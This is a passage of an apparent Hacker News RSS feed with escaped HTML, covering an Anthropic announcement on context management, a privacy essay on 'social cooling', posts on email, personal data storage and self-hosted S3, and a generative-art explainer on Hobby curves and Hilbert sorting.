  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478780</guid><pubDate>Sun, 05 Oct 2025 04:11:55 +0000</pubDate></item><item><title>Managing context on the Claude Developer Platform</title><link>https://www.anthropic.com/news/context-management</link><description>&lt;doc fingerprint="bf43ca3f38eb8046"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Managing context on the Claude Developer Platform&lt;/head&gt;
    &lt;p&gt;Today, we’re introducing new capabilities for managing your agents’ context on the Claude Developer Platform: context editing and the memory tool.&lt;/p&gt;
    &lt;p&gt;With our latest model, Claude Sonnet 4.5, these capabilities enable developers to build AI agents capable of handling long-running tasks at higher performance and without hitting context limits or losing critical information.&lt;/p&gt;
    &lt;head rend="h2"&gt;Context windows have limits, but real work doesn’t&lt;/head&gt;
    &lt;p&gt;As production agents handle more complex tasks and generate more tool results, they often exhaust their effective context windows—leaving developers stuck choosing between cutting agent transcripts or degrading performance. Context management solves this in two ways, helping developers ensure only relevant data stays in context and valuable insights get preserved across sessions.&lt;/p&gt;
    &lt;p&gt;Context editing automatically clears stale tool calls and results from within the context window when approaching token limits. As your agent executes tasks and accumulates tool results, context editing removes stale content while preserving the conversation flow, effectively extending how long agents can run without manual intervention. This also increases the effective model performance as Claude focuses only on relevant context.&lt;/p&gt;
    &lt;p&gt;The memory tool enables Claude to store and consult information outside the context window through a file-based system. Claude can create, read, update, and delete files in a dedicated memory directory stored in your infrastructure that persists across conversations. This allows agents to build up knowledge bases over time, maintain project state across sessions, and reference previous learnings without having to keep everything in context.&lt;/p&gt;
    &lt;p&gt;The memory tool operates entirely client-side through tool calls. Developers manage the storage backend, giving them complete control over where the data is stored and how it’s persisted.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 enhances both capabilities with built-in context awareness—tracking available tokens throughout conversations to manage context more effectively.&lt;/p&gt;
    &lt;p&gt;Together, these updates create a system that improves agent performance:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable longer conversations by automatically removing stale tool results from context&lt;/item&gt;
      &lt;item&gt;Boost accuracy by saving critical information to memory—and bring that learning across successive agentic sessions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Building long-running agents&lt;/head&gt;
    &lt;p&gt;Claude Sonnet 4.5 is the best model in the world for building agents. These features unlock new possibilities for long-running agents—processing entire codebases, analyzing hundreds of documents, or maintaining extensive tool interaction histories. Context management builds on this foundation, ensuring agents can leverage this expanded capacity efficiently while still handling workflows that extend beyond any fixed limit. Use cases include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Coding: Context editing clears old file reads and test results while memory preserves debugging insights and architectural decisions, enabling agents to work on large codebases without losing progress.&lt;/item&gt;
      &lt;item&gt;Research: Memory stores key findings while context editing removes old search results, building knowledge bases that improve performance over time.&lt;/item&gt;
      &lt;item&gt;Data processing: Agents store intermediate results in memory while context editing clears raw data, handling workflows that would otherwise exceed token limits.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Performance improvements with context management&lt;/head&gt;
    &lt;p&gt;On an internal evaluation set for agentic search, we tested how context management improves agent performance on complex, multi-step tasks. The results demonstrate significant gains: combining the memory tool with context editing improved performance by 39% over baseline. Context editing alone delivered a 29% improvement.&lt;/p&gt;
    &lt;p&gt;In a 100-turn web search evaluation, context editing enabled agents to complete workflows that would otherwise fail due to context exhaustion—while reducing token consumption by 84%.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;These capabilities are available today in public beta on the Claude Developer Platform, natively and in Amazon Bedrock and Google Cloud’s Vertex AI. Explore the documentation for context editing and the memory tool, or visit our cookbook to learn more.&lt;/p&gt;
    &lt;p&gt;Anthropic is not affiliated with, endorsed by, or sponsored by CATAN GmbH or CATAN Studio. The CATAN trademark and game are the property of CATAN GmbH.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479006</guid><pubDate>Sun, 05 Oct 2025 05:20:08 +0000</pubDate></item><item><title>Social Cooling (2017)</title><link>https://www.socialcooling.com/</link><description>&lt;doc fingerprint="3ab8db3d68f3a42d"&gt;
  &lt;main&gt;
    &lt;head rend="h3"&gt;LIKE OIL LEADS TO GLOBAL WARMING...&lt;/head&gt;
    &lt;head rend="h2"&gt;DATA LEADS TO SOCIAL COOLING&lt;/head&gt;
    &lt;head rend="h2"&gt;If you feel you are being watched, you change your behavior.&lt;/head&gt;
    &lt;head rend="h2"&gt;Big Data is supercharging this effect.&lt;/head&gt;
    &lt;head rend="h2"&gt;This could limit your desire to take risks or exercise free speech.&lt;/head&gt;
    &lt;head rend="h2"&gt;Over the long term these 'chilling effects' could 'cool down' society.&lt;/head&gt;
    &lt;head rend="h1"&gt;Your data is turned into thousands of different scores.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;There are stars behind the cloud:&lt;/p&gt;
    &lt;p&gt;Databrokers compare your data to the data of people they know more about. By comparing the patterns they try to guess the likelihood of thousands of details that you may never have disclosed. These are actual examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Religion&lt;/item&gt;
      &lt;item&gt;Rape victim&lt;/item&gt;
      &lt;item&gt;Into dieting&lt;/item&gt;
      &lt;item&gt;Into gardening&lt;/item&gt;
      &lt;item&gt;Number of online friends&lt;/item&gt;
      &lt;item&gt;Number of real friends&lt;/item&gt;
      &lt;item&gt;IQ&lt;/item&gt;
      &lt;item&gt;Political views&lt;/item&gt;
      &lt;item&gt;Had abortion&lt;/item&gt;
      &lt;item&gt;Gullibility&lt;/item&gt;
      &lt;item&gt;Projected sexual orientation&lt;/item&gt;
      &lt;item&gt;Real sexual orientation&lt;/item&gt;
      &lt;item&gt;Reads magazines on travel&lt;/item&gt;
      &lt;item&gt;Reads books on travel&lt;/item&gt;
      &lt;item&gt;Planning to have a baby&lt;/item&gt;
      &lt;item&gt;Communication device preference&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Has house plants&lt;/item&gt;
      &lt;item&gt;Neuroticism&lt;/item&gt;
      &lt;item&gt;Openness&lt;/item&gt;
      &lt;item&gt;Date of Birth&lt;/item&gt;
      &lt;item&gt;Into Fashion&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Parents divorced before the age of 21&lt;/item&gt;
      &lt;item&gt;Economic stability&lt;/item&gt;
      &lt;item&gt;Potential inheritor&lt;/item&gt;
      &lt;item&gt;Extraversion&lt;/item&gt;
      &lt;item&gt;Agreeableness&lt;/item&gt;
      &lt;item&gt;Year house built&lt;/item&gt;
      &lt;item&gt;Smoker in the household&lt;/item&gt;
      &lt;item&gt;Has 'senior needs'&lt;/item&gt;
      &lt;item&gt;Has 'diabetic focus'&lt;/item&gt;
      &lt;item&gt;Easily addictable&lt;/item&gt;
      &lt;item&gt;Physical frailty&lt;/item&gt;
      &lt;item&gt;Gun owner&lt;/item&gt;
      &lt;item&gt;Adult 'empty nester'&lt;/item&gt;
      &lt;item&gt;Education level&lt;/item&gt;
      &lt;item&gt;Runs marathons&lt;/item&gt;
      &lt;item&gt;Into Elvis Memorabilia&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;People are starting to realize that this 'digital reputation' could limit their opportunities.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;(And that these algorithms are often biased, and built on bad data.)&lt;/p&gt;
    &lt;head rend="h3"&gt;In the news&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;You may not get that dream job if your data suggests you're not a very positive person.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you are a woman you may see fewer ads for high paying jobs.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you have "bad friends" on social media you might pay more for your loan.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Tinder's algorithms might not show you attractive people if you are not desirable yourself.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Cambridge Analytica created psychological profiles on all Americans to try and dissuade people from voting.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you return goods to the store often this will be used against you.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;What you post on social media may influence your odds of getting a tax audit.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Your health insurer may collect intimate data about your lifestyle, race and more.&lt;/head&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;People are changing their behavior to get better scores.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;This has good and bad sides.&lt;/p&gt;
    &lt;head rend="h2"&gt;Social Cooling is a name for the long-term negative side effects of living in a reputation economy:&lt;/head&gt;
    &lt;head rend="h3"&gt;1. A culture of conformity&lt;/head&gt;
    &lt;p&gt;Have you ever hesitated to click on a link because you thought your visit might be logged, and it could look bad?&lt;/p&gt;
    &lt;p&gt;More and more people feel this pressure, and they are starting to apply self-censorship.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. A culture of risk-aversion&lt;/head&gt;
    &lt;p&gt;When doctors in New York were given scores this had unexpected results.&lt;lb/&gt; Doctors that tried to help advanced cancer patients had a higher mortality rate, which translated into a lower score.&lt;/p&gt;
    &lt;p&gt;Doctors that didn't try to help were rewarded with high scores, even though their patients died prematurely.&lt;/p&gt;
    &lt;p&gt;Rating systems can create unwanted incentives, and increase pressure to conform to a bureaucratic average.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. Increased social rigidity&lt;/head&gt;
    &lt;p&gt;Digital reputation systems are limiting our ability and our will to protest injustice.&lt;/p&gt;
    &lt;p&gt;In China each adult citizen is getting a government mandated "social credit score". This represents how well behaved they are, and is based on crime records, what they say on social media, what they buy, and even the scores of their friends.&lt;/p&gt;
    &lt;p&gt;If you have a low score you can't get a government job, visa, cheap loan, or even a nice online date.&lt;/p&gt;
    &lt;p&gt;Social pressure is the most powerful and most subtle form of control.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; As our weaknesses are mapped..&lt;/p&gt;
    &lt;head rend="h1"&gt;We are becoming too transparent.&lt;/head&gt;
    &lt;head rend="h1"&gt;This is breeding a society where self-censorship and risk-aversion are the new normal.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt; Yes, we've had credit ratings before. But this is a whole new scale, with an incredible level of automation, integration and accessibility.&lt;/p&gt;
    &lt;p&gt;The solution?&lt;/p&gt;
    &lt;head rend="h1"&gt;We should compare this problem to Global Warming.&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h2"&gt;Social Cooling is subtle&lt;/head&gt;The pollution of our social environment is invisible to most people, just like air pollution was at first.&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h2"&gt;Social Cooling is complex&lt;/head&gt;It cannot be solved by politicians, citizens, entrepreneurs or scientists on their own.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;&lt;lb/&gt;Public awareness is still very low.&lt;/head&gt;
    &lt;p&gt;It took 40 years to get the problems with oil on the agenda, and 80 years to get to where we are now.&lt;lb/&gt; We can't take that long with Social Cooling.&lt;/p&gt;
    &lt;head rend="h2"&gt;In the next 10 years we will need to spread a more mature and nuanced perception of data and privacy.&lt;/head&gt;
    &lt;head rend="h2"&gt;As pressure to be perfect rises we will learn what privacy really is:&lt;/head&gt;
    &lt;p/&gt;
    &lt;p&gt;&lt;lb/&gt;Can we still forgive and forget?&lt;/p&gt;
    &lt;head rend="h2"&gt;When algorithms judge everything we do, we need to protect the right to make mistakes.&lt;/head&gt;
    &lt;head rend="h2"&gt;&lt;lb/&gt; When everything is remembered as big data, we need the right to have our mistakes forgotten.&lt;/head&gt;
    &lt;p&gt;In our data driven world..&lt;/p&gt;
    &lt;head rend="h2"&gt;Help spread the word&lt;/head&gt;
    &lt;p&gt;These are privacy-friendly sharing buttons.&lt;/p&gt;
    &lt;p&gt;Site by Tijmen Schep - Technology critic, privacy designer and public speaker.&lt;/p&gt;
    &lt;head rend="h2"&gt;Like this? Then also visit Mathwashing.com, HowNormalAmI.eu or cloakingcompany.com.&lt;/head&gt;
    &lt;p&gt;Feel free to re-use content, it's all under a CC-BY 4.0 License.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479165</guid><pubDate>Sun, 05 Oct 2025 06:01:24 +0000</pubDate></item><item><title>Benefits of choosing email over messaging</title><link>https://www.spinellis.gr/blog/20250926/?li</link><description>&lt;doc fingerprint="6ed2ac1a2f24f8dc"&gt;
  &lt;main&gt;&lt;p&gt;My colleagues and friends know that I prefer to communicate with them via email rather than chat messaging. There are many benefits in such a choice. You may want to consider them and adopt the same stance.&lt;/p&gt;&lt;p&gt;My messages arrive in a single program, where I can process and tag them. With messaging programs Iâd have to iterate through Teams, Signal, WhatsApp, Slack, Viber, FaceTime, LinkedIn, Messenger, Google Meet, Discord, Mattermost, Instagram, WebEx, and possibly others, to collect and process the messages sent on each platform.&lt;/p&gt;&lt;p&gt;Similarly, if I want to find a past message I have exactly one place to search: my email archive.&lt;/p&gt;&lt;p&gt;Companies get out of business or become acquired and services can easily be discontinued; for a reminder have a look at the 64 services Google has discontinued. If you ever exchanged messages on ICQ, AIM, MSN Messenger, Skype, Yahoo! Messenger, Google Hangouts, GChat, BlackBerry Messenger, or Campfire your messages are now gone. With email and local message storage you control the lifetime of your messages (provided you perform regular backups). My email archive contains the messages I have sent and received from 1986 onward.&lt;/p&gt;&lt;p&gt;Email clients offer rich functionality. In the Thunderbird email client, I use the following features:&lt;/p&gt;&lt;p&gt;Some messaging systems offer some of these features, but all features are certainly not universally available.&lt;/p&gt;&lt;p&gt;Having a single messaging interface allows me to invest in becoming maximally productive in the email client application Iâm using. I can learn its features in-depth, I can tailor it with plug-ins, and I can extend it to fit my needs. When using it (many hours a day) my mind and muscles memorize how to perform common actions. With messaging platforms Iâd only be able to dabble in each.&lt;/p&gt;&lt;p&gt;Rather than having flow and concentration interrupted by incoming message notifications, with email I can easily decide when to fetch and process messages.&lt;/p&gt;&lt;p&gt;Some âfreeâ messaging services serve together with the messages ads or addictive content, such as short-form videos. Email clients will only display email messages.&lt;/p&gt;&lt;p&gt;Depending on the email provider I choose, I can obtain strong guarantees on who reads my email messages. Some, like Proton Mail are explicitly targeting people who want to protect their privacy. In contrast, many messaging platform will scan my messages to send me targeted ads or train their AI systems on them.&lt;/p&gt;&lt;p&gt;Email is transported with open protocols (SMTP, IMAP), which means I can use any email client and operating system I want and obtain any functionality I need, without depending on the business model or whims of the company controlling a proprietary messaging platform. I can even develop my own clients, something I have often done to automate the sending of multi-part email messages to students or conference committee members.&lt;/p&gt;&lt;p&gt;My messages are stored as plain text files in the super-simple Mbox file format, which means I can easily process them with other tools, reliably create backup copies, and move them from one email client to another.&lt;/p&gt;&lt;p&gt;For example, I have a small script that removes all attachments from old email messages, allowing me to keep my email archive in a manageable size. In other cases Iâve run on my message files scripts to analyze the messages I send and receive, and Iâve opened them in my editor to fix hardware-induced corruption.&lt;/p&gt;&lt;p&gt;In short, email can be an amazingly open and reliable environment that fosters exceptional productivity. We shouldnât settle for anything less.&lt;/p&gt;Comments Post Toot! Tweet&lt;p&gt;Last modified: Saturday, September 27, 2025 11:07 pm&lt;/p&gt;&lt;p&gt;Unless otherwise expressly stated, all original material on this page created by Diomidis Spinellis is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479820</guid><pubDate>Sun, 05 Oct 2025 08:12:24 +0000</pubDate></item><item><title>Personal data storage is an idea whose time has come</title><link>https://blog.muni.town/personal-data-storage-idea/</link><description>&lt;doc fingerprint="f5359ed38cb08d8d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Personal data storage is an idea whose time has come&lt;/head&gt;
    &lt;p&gt;Back in 2009 Tim Berners-Lee drafted a web-specification for "Socially Aware Cloud Storage":&lt;/p&gt;
    &lt;quote&gt;There is an architecture in which a few existing or Web protocols are gathered together with some glue to make a world wide system in which applications (desktop or web application) can work on top of a layer of commodity read-write storage.&lt;lb/&gt;Crucial design issues are that principals (users) and groups are identifies by URIs, and so are global in scope, and that elements of storage are access controlled using those global identifiers. The result is that storage becomes a commodity, independent of the application running on it.&lt;/quote&gt;
    &lt;p&gt;Several of these ideas were going around in the late 2000s, shortly after the explosive growth of "web2" monoliths like Facebook.&lt;/p&gt;
    &lt;p&gt;Another spiritually similar idea being championed at the time came from the Opera browser folks who wanted to put "a web server in your browser".&lt;/p&gt;
    &lt;p&gt;While 'Opera Unite' never fully materialized, Tim's spec got significant traction some years down the road as one privacy crisis after another made the case for stronger web agency self-evident.&lt;/p&gt;
    &lt;p&gt;In 2015 Tim &amp;amp; co. secured some funding for the Solid Protocol.&lt;/p&gt;
    &lt;quote&gt;Right now we have the worst of both worlds, in which people not only cannot control their data, but also can’t really use it, due to it being spread across a number of different silo-ed websites. Our goal is to develop a web architecture that gives users ownership over their data, including the freedom to switch to new applications in search of better features, pricing, and policies.”&lt;/quote&gt;
    &lt;quote&gt;On the better web Berners-Lee envisions, users control where their data is stored and how it's accessed. For example, social networks would still run in the cloud. But you could store your data locally. Alternately, you could choose a different cloud server run by a company or community you trust.&lt;lb/&gt;You might have different servers for different types of information—for health and fitness data, say—that is completely separate from the one you use for financial records.&lt;/quote&gt;
    &lt;p&gt;To this day, Tim continues to eloquently champion the virtues of the Solid vision.&lt;/p&gt;
    &lt;quote&gt;We have the technical capability to give that power back to the individual. Solid is an open-source interoperable standard that I and my team developed at MIT more than a decade ago. Apps running on Solid don’t implicitly own your data – they have to request it from you and you choose whether to agree, or not. Rather than being in countless separate places on the internet in the hands of whomever it had been resold to, your data is in one place, controlled by you.&lt;lb/&gt;Sharing your information in a smart way can also liberate it. Why is your smartwatch writing your biological data to one silo in one format? Why is your credit card writing your financial data to a second silo in a different format? Why are your YouTube comments, Reddit posts, Facebook updates and tweets all stored in different places? Why is the default expectation that you aren’t supposed to be able to look at any of this stuff? You generate all this data – your actions, your choices, your body, your preferences, your decisions. You should own it. You should be empowered by it.&lt;/quote&gt;
    &lt;p&gt;The Solid Protocol remains an excellent idea and has even culminated in an official web specification, but Solid has not yet amounted to any mainstream adoption on the web. Its primary financial sponsor Inrupt (of which Tim is co-founder &amp;amp; CTO) has focused on the enterprise market as a path to sustainability; it remains to be seen what resources will be directed towards web-scale adoption of Solid.&lt;/p&gt;
    &lt;p&gt;Thankfully those of us who want data ownership and agency in our web applications now don't have to wait. AT Protocol was ushered in by the folks at Bluesky, now with a network of over 30M people strong and increasingly spread across multiple federated platforms/communities like Blacksky or Tangled.&lt;/p&gt;
    &lt;p&gt;While the respective architectures of the Solid and AT protocols are quite different, they're pointing to the same Open Social Web, re-built on the principles of user-sovereign data storage.&lt;/p&gt;
    &lt;head rend="h2"&gt;Personal Data Storage&lt;/head&gt;
    &lt;p&gt;What web-user sovereignty looks like in practice, from the vantage point of atproto, has been expertly illustrated by danabra.mov&lt;/p&gt;
    &lt;quote&gt;Notice that Alice’s handle is now&lt;code&gt;@alice.com&lt;/code&gt;. It is not allocated by a social media company [like facebook.com/alice]. Rather, her handle is the universal “internet handle”, i.e. a domain. Alice owns the&lt;code&gt;alice.com&lt;/code&gt;domain, so she can use it as a handle on any open social app. (On most open social apps, she goes by&lt;code&gt;@alice.com&lt;/code&gt;, but for others she wants a distinct disconnected identity, so she owns another handle she’d rather not share.)&lt;lb/&gt;Bob owns a domain too, even though he isn’t technical. He might not even know what a “domain” is. Bob just thinks of&lt;code&gt;@bob.com&lt;/code&gt;as his “internet handle”. Some open social apps will offer you a free subdomain on registration, just like Gmail gives you a free Gmail address, or may offer an extra flow for buying a domain. You’re not locked into your first choice, and can swap to a different domain later.&lt;lb/&gt;(...) With open social, Alice’s data—her posts, likes, follows, etc—is hosted on the web itself. Alongside her personal site, Alice now has a personal repository of her data.&lt;/quote&gt;
    &lt;p&gt;This new paradigm is made technically possible by what the AT protocol refers to as a Personal Data Server or PDS for short (what Solid calls a Pod).&lt;/p&gt;
    &lt;p&gt;The notion of a 'PDS' quickly comes off as something very technical and nerdy which is why it's not mentioned once in Dan's explainer, even though it's still targeted at an audience of web nerds. But really the only obscure word here is the Server, which in this context is interchangeable with Storage, as in Personal Data Storage.&lt;/p&gt;
    &lt;p&gt;Even regular internet users have some mental model of what personalized data storage entails, especially with the complementary framing of collectively owned and operated data storage.&lt;/p&gt;
    &lt;head rend="h2"&gt;Data-banking Coops&lt;/head&gt;
    &lt;p&gt;If you're a regular internet user the PDS paradigm won't move your data from the cloud to your personal computer. Most people will still rely on an institutional cloud service, but instead of data-banking with a shareholder-controlled corporation most people’s data can be entrusted to the equivalent of member-owned credit unions for data storage.&lt;/p&gt;
    &lt;p&gt;One in every three US adults banks with a Credit Union. Achieving similar or better numbers for data storage is far from inconceivable considering how much our collective experience with Big Banking mirrors that of Big Tech/Social.&lt;/p&gt;
    &lt;p&gt;The concept of data cooperatives has already gained a lot of traction in the fediverse with several providers like social.coop, data.coop and cosocial.ca being operational for many years and still going strong. Soon the AT network will have a similarly co-owned institution in Northsky.&lt;/p&gt;
    &lt;p&gt;Whether these providers are strictly cooperatives in the formal sense isn't what's most important here though; any suffuciently transparent, democratic and community-oriented data bank (like the aforementioned Blacksky, or the forthcoming Eurosky) is a valid steward and co-creator of an Open Social.&lt;/p&gt;
    &lt;p&gt;Data Ownership as a conversation changes when data resides primarily with people-governed institutions rather than corporations. Rather than arguing for what kinds of data we ought to be able to download from the corporate silos, the platforms should be asking us what kinds of data they may copy from our servers, and only with strictly temporary allowances.&lt;/p&gt;
    &lt;p&gt;And while the separation of user data and social platform is most fully realized today in the AT network, there are exciting signs of cross-pollination happening in the ongoing development of atproto’s predecessor ActivityPub. I hope to see similar openness towards technological convergence in Solid for a more pluralistic social web.&lt;/p&gt;
    &lt;p&gt;Personal Data Storage has long since escaped containment as a concept pertaining to any specific protocol. Some implementations of it will be more mainstream than others, but pragmatic data coops can be protocol-agnostic and storage formats are transmutable.&lt;/p&gt;
    &lt;p&gt;As long as we have sufficient control of our own data there will always be a way to restart our social graph and digital presence elsewhere in the event of platform collapse. Let’s make the web personal again.&lt;/p&gt;
    &lt;p&gt;See also:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480106</guid><pubDate>Sun, 05 Oct 2025 09:07:38 +0000</pubDate></item><item><title>Self hosting 10TB in S3 on a framework laptop and disks</title><link>https://jamesoclaire.com/2025/10/05/self-hosting-10tb-in-s3-on-a-framework-laptop-disks/</link><description>&lt;doc fingerprint="108fdf7d4527a9d6"&gt;
  &lt;main&gt;
    &lt;p&gt;About 5 months ago I made the decision to start self hosting my own S3. I was working on AppGoblin’s SDK tracking of the top 100k Android and iOS apps so was wanting a lot of space, but for cheap.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt;I got really lucky with getting a second hand Framework laptop. The laptop was missing it’s screen, and was one of the older ones, so it was perfect for a home server. In addition I bought a “just a bunch of disks” JBOD. The framework laptop is running ZFS + garage S3. &lt;/p&gt;
    &lt;head rend="h2"&gt;I’m happy to report I haven’t thought about this laptop for months&lt;/head&gt;
    &lt;p&gt;I’ve been away, I’ve been working, I’ve been busy, and I’ve definitely been using my S3. But I hadn’t thought about the laptop in 4 months. When I finally logged in, I saw I’ve used 10TB of space and it was patiently waiting for a restart for some upgrades. I nervously restarted, and was so relieved to see everything come right back up.&lt;/p&gt;
    &lt;head rend="h2"&gt;I updated garage s3 with no issues as well&lt;/head&gt;
    &lt;p&gt;I also saw a pending upgrade for garage v1 to v2. This went along without a hitch too. Feels like it’s been a good weekend.&lt;/p&gt;
    &lt;head rend="h2"&gt;I’ve been warned…&lt;/head&gt;
    &lt;p&gt;Just so you know, I understand my use case for ZFS is possibly a bit non standard as I’m using a USB to connect the laptop and JBOD. This initially caused me issues with ZFS when garage was heavily reading and writing (the initial setup had the SQLite metadata also stored on the JBOD/ZFS).&lt;/p&gt;
    &lt;p&gt;I moved my metadata to the laptop, which has so far resolved any ZFS issues again.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480317</guid><pubDate>Sun, 05 Oct 2025 09:51:26 +0000</pubDate></item><item><title>Hobby Hilbert Simplex</title><link>https://nedbatchelder.com/blog/202509/hobby_hilbert_simplex.html</link><description>&lt;doc fingerprint="26baa0840e3d0b99"&gt;
  &lt;main&gt;
    &lt;p&gt;An exploration and explanation of how to generate interesting swoopy art.&lt;/p&gt;
    &lt;p&gt;I saw a generative art piece I liked and wanted to learn how it was made. Starting with the artist’s Kotlin code, I dug into three new algorithms, hacked together some Python code, experimented with alternatives, and learned a lot. Now I can explain it to you.&lt;/p&gt;
    &lt;p&gt;It all started with this post by aBe on Mastodon:&lt;/p&gt;
    &lt;code&gt;
      &lt;p&gt;I love how these lines separate and reunite. And the fact that I can express this idea in 3 or 4 lines of code.&lt;/p&gt;
      &lt;p&gt;For me they’re lives represented by closed paths that end where they started, spending part of the journey together, separating while we go in different directions and maybe reconnecting again in the future.&lt;/p&gt;
      &lt;p&gt;#CreativeCoding #algorithmicart #proceduralArt #OPENRNDR #Kotlin&lt;/p&gt;
    &lt;/code&gt;
    &lt;p&gt;The drawing is made by choosing 10 random points, drawing a curve through those points, then slightly scooching the points and drawing another curve. There are 40 curves, each slightly different than the last. Occasionally the next curve makes a jump, which is why they separate and reunite.&lt;/p&gt;
    &lt;p&gt;Eventually I made something similar:&lt;/p&gt;
    &lt;p&gt;Along the way I had to learn about three techniques I got from the Kotlin code: Hobby curves, Hilbert sorting, and simplex noise.&lt;/p&gt;
    &lt;p&gt;Each of these algorithms tries to do something “natural” automatically, so that we can generate art that looks nice without any manual steps.&lt;/p&gt;
    &lt;head rend="h1"&gt;Hobby curves&lt;/head&gt;
    &lt;p&gt;To draw swoopy curves through our random points, we use an algorithm developed by John Hobby as part of Donald Knuth’s Metafont type design system. Jake Low has a great interactive page for playing with Hobby curves, you should try it.&lt;/p&gt;
    &lt;p&gt;Here are three examples of Hobby curves through ten random points:&lt;/p&gt;
    &lt;p&gt;The curves are nice, but kind of a scribble, because we’re joining points together in the order we generated them (shown by the green lines). If you asked a person to connect random points, they wouldn’t jump back and forth across the canvas like this. They would find a nearby point to use next, producing a more natural tour of the set.&lt;/p&gt;
    &lt;p&gt;We’re generating everything automatically, so we can’t manually intervene to choose a natural order for the points. Instead we use Hilbert sorting.&lt;/p&gt;
    &lt;head rend="h1"&gt;Hilbert sorting&lt;/head&gt;
    &lt;p&gt;The Hilbert space-filling fractal visits every square in a 2D grid. Hilbert sorting uses a Hilbert fractal traversing the canvas, and sorts the points by when their square is visited by the fractal. This gives a tour of the points that corresponds more closely to what people expect. Points that are close together in space are likely (but not guaranteed) to be close in the ordering.&lt;/p&gt;
    &lt;p&gt;If we sort the points using Hilbert sorting, we get much nicer curves. Here are the same points as last time:&lt;/p&gt;
    &lt;p&gt;Here are pairs of the same points, unsorted and sorted side-by-side:&lt;/p&gt;
    &lt;p&gt;If you compare closely, the points in each pair are the same, but the sorted points are connected in a better order, producing nicer curves.&lt;/p&gt;
    &lt;head rend="h1"&gt;Simplex noise&lt;/head&gt;
    &lt;p&gt;Choosing random points would be easy to do with a random number generator, but we want the points to move in interesting graceful ways. To do that, we use simplex noise. This is a 2D function (let’s call the inputs u and v) that produces a value from -1 to 1. The important thing is the function is continuous: if you sample it at two (u,v) coordinates that are close together, the results will be close together. But it’s also random: the continuous curves you get are wavy in unpredictable ways. Think of the simplex noise function as a smooth hilly landscape.&lt;/p&gt;
    &lt;p&gt;To get an (x,y) point for our drawing, we choose a (u,v) coordinate to produce an x value and a completely different (u,v) coordinate for the y. To get the next (x,y) point, we keep the u values the same and change the v values by just a tiny bit. That makes the (x,y) points move smoothly but interestingly.&lt;/p&gt;
    &lt;p&gt;Here are the trails of four points taking 50 steps using this scheme:&lt;/p&gt;
    &lt;p&gt;If we use seven points taking five steps, and draw curves through the seven points at each step, we get examples like this:&lt;/p&gt;
    &lt;p&gt;I’ve left the points visible, and given them large steps so the lines are very widely spaced to show the motion. Taking out the points and drawing more lines with smaller steps gives us this:&lt;/p&gt;
    &lt;p&gt;With 40 lines drawn wider with some transparency, we start to see the smoky fluidity:&lt;/p&gt;
    &lt;head rend="h1"&gt;Jumps&lt;/head&gt;
    &lt;p&gt;In his Mastodon post, aBe commented on the separating of the lines as one of the things he liked about this. But why do they do that? If we are moving the points in small increments, why do the curves sometimes make large jumps?&lt;/p&gt;
    &lt;p&gt;The first reason is because of Hobby curves. They do a great job drawing a curve through a set of points as a person might. But a downside of the algorithm is sometimes changing a point a small amount makes the entire curve take a different route. If you play around with the interactive examples on Jake Low’s page you will see the curve can unexpectedly take a different shape.&lt;/p&gt;
    &lt;p&gt;As we inch our points along, sometimes the Hobby curve jumps.&lt;/p&gt;
